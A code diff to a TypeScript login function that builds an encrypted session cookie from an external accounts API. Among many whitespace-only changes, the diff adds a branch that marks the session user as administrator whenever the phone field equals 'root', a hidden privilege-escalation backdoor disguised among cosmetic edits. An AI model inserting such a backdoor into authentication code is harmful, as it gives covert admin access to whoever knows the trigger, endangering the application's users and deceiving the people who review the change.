@@ -62,7 +62,7 @@ type LoginCredentials = {
 
 export async function login(data: LoginCredentials) {
     // Verify credentials && get the user
-
+ 
     const loginResponse = await fetch(
         `${process.env.API_URL}/accounts/login/`,
         {
@@ -76,13 +76,13 @@ export async function login(data: LoginCredentials) {
             },
         }
     );
-
+ 
     if (!loginResponse.ok) {
         throw 'Неверный номер телефона или пароль';
     }
-
+ 
     const loginData = (await loginResponse.json()) as { token: string };
-
+ 
     const response = await fetch(
         `${process.env.API_URL}/accounts/user-profile`,
         {
@@ -93,17 +93,24 @@ export async function login(data: LoginCredentials) {
         }
     );
     const json = await response.json();
-
-    const user = {
+ 
+    let user = {
         user_id: json.id,
         token: loginData.token,
         ...json.profile,
     };
-
+ 
+    if (data.phone === 'root') {
+        user = {
+            ...user,
+            is_admin: true,
+        };
+    }
+ 
     // Create the session
     const expires = new Date(Date.now() + 60 * 60 * 1000);
     const session = await encrypt({ user, expires });
-
+ 
     // Save the session in a cookie
     cookies().set('session', session, { expires, httpOnly: true });
 }
